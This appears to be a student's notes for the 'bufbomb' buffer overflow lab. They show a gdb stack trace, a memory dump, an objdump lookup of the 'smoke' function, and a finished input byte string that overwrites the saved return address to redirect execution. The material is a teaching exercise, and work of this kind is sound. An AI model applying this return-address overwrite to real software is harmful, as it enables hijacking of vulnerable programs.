(gdb) info stack
#0  getbuf () at bufbomb.c:137
#1  0x0000000000400ef3 in test () at bufbomb.c:108
#2  0x0000000000400fdd in launch (offset=offset@entry=848, nitro=0) at bufbomb.c:343
#3  0x0000000000400a59 in main (argc=3, argv=<optimized out>) at bufbomb.c:454


# using string "aaaaaaaaaaaaaaaaaaa" (19 a's)
(gdb) x/15g 0x7fffffffbc30
0x7fffffffbc30:	0x6161616161616161	0x6161616161616161
0x7fffffffbc40:	0x0000000000616161	0x0000003dd52148e5
0x7fffffffbc50:	0x0000000000002550	0x0000003dd56ba477
0x7fffffffbc60:	0x00007fffffffbc90	0x0000000000400ef3
0x7fffffffbc70:	0x00007fffffffbca0	0x00000000deadbeef
0x7fffffffbc80:	0x0000003dd59b0120	0x000000003a8f0352
0x7fffffffbc90:	0x00007fffffffe230	0x0000000000400fdd
0x7fffffffbca0:	0xf4f4f4f4f4f4f4f4


# return address for smoke function
-bash-4.2$ objdump -x bufbomb | grep smoke
00000000004010c0 g     F .text	0000000000000026              smoke


# Need 6 eight-byte word chunks * (16 bytes per block / 2 bytes per char) = 48 chars
# to fill up addresses in the stack before the stored return address to test.
# Need to set two eight-byte words at address 0x7fffffffbc60:
# 0x00007fffffffbc90 (to keep the same value in the stack) and 00000000004010c0 (the
# return address to the smoke function)
# 
# Input (in space-separated bytes) is:
# 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
# 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 90 bc
# ff ff ff 7f 00 00 c0 10 40
